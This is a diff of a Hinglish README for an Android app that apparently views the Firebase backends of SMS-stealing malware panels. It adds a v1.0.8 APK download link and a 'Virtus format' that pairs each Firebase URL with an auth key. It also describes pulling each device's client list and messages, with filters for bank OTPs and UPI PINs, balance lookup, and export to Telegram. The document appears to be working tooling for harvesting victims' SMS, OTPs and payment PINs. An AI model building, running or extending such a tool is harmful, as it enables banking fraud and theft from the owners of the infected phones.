@@ -4,8 +4,8 @@ Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB
 
 ## Signed APK
 
-**Download (latest signed, v1.0.7):**  
-`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.7-release-signed.apk`
+**Download (latest signed, v1.0.8):**  
+`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.8-release-signed.apk`
 
 **Signed** — phone pe “Install unknown apps” allow karo. Older: `FirebaseSmsPanel-1.0-release-signed.apk` (purana build).
 
@@ -37,7 +37,7 @@ Optional (unsigned, agar repo me rakha ho):
 
 ## Use
 
-1. **TXT** → Firebase URL list wali `.txt` pick karo (newline / mixed text dono). Load ke turant baad **auto-fetch nahi** — pehle filters set karo.
+1. **TXT** → **Virtus format** (same as Virtus Panel Viewer Pro `assets/index.html`): har panel ke liye **Firebase URL** line + **Auth Key** line. Plain URL-only lines bhi chalengi agar DB **public read** ho. Load ke turant baad **auto-fetch nahi** — pehle filters set karo.
 2. **Fetch Live** → 45s auto-refresh ON + immediate fetch (same filters).
 3. **Start Fetch** → pehla pull ya dubara pull (URLs load hone ke baad, filters ke saath).
 4. **Export TXT** → filtered device list share (Telegram/Drive).
@@ -51,7 +51,15 @@ Optional (unsigned, agar repo me rakha ho):
 12. **PIN filter** — Bank modes: With / Without / Both (device-level UPI/PIN detection).
 13. **SMS age** — `1d` … `30d` ya **All** (timestamp missing = still shown).
 14. **Live refresh** — **Fetch Live** = 45s job ON.
-15. **Device Details** — card tap ya **Info (i)**; **yellow** background, white card: **Balance (fetch)**, battery, SIM, forwarder, UPI PIN, SMS list (green MSG). Fetch ke baad line: **… URLs · N SMS** (kitna data aaya). **v1.0.7**
+15. **Device Details** — card tap ya **Info (i)**; **yellow** background, white card: **Balance (fetch)**, battery, SIM, forwarder, UPI PIN, SMS list (green MSG). Fetch ke baad line: **… panels · N SMS** (kitna data aaya). **v1.0.8**
+
+### Virtus fetch (auth + `clients` + `messages`)
+
+- **Secret key:** Har request `...json?auth=<Auth Key>` (Drive APK jaisa).
+- Pehle **`clients.json`** — device ids + model/battery/status.
+- Phir har device: **`messages/<deviceId>.json`** — pehle `orderBy="$key"&limitToLast=3500`, khali ho to poora node.
+
+Bina key ke sirf **public** DB ka data aayega; warna TXT me **KEY:** line add karo.
 
 ## Data
 
@@ -60,5 +68,5 @@ Optional (unsigned, agar repo me rakha ho):
 
 ## Notes
 
-- Firebase RTDB **public read** hona chahiye warna kuch nahi aayega.
+- **Auth Key** ke saath **rules read** ho; bina key **public** read wale projects hi chalenge.
 - OTP mode spam short-links hata hai; baaki telco sender IDs match karne ki koshish.
